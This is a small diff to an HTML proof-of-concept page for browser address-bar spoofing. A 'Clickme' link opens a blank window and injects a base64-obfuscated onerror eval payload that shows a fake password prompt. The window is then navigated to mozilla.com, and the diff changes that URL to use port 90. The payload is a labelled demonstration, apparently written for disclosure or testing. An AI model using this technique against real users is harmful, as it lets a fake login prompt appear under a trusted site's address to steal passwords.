@@ -10,7 +10,7 @@
         pwn = () => {
             x = window.open("about:blank", "test");
             x.document.write("<img src=@ onerror=eval(atob('c2V0VGltZW91dCgicHJvbXB0KCdmYWtlIGJhaWR1LmNvbSAsIERvbnQgZW50ZXIgcGFzc3dvcmQgeEQnKSIsMjAwMCk='))>");
-            setTimeout("x.location='https://mozilla.com'", 1000);
+            setTimeout("x.location='https://mozilla.com:90'", 1000);
         }
     </script>
     <a onclick="pwn()"><h1>Clickme</h1></a>
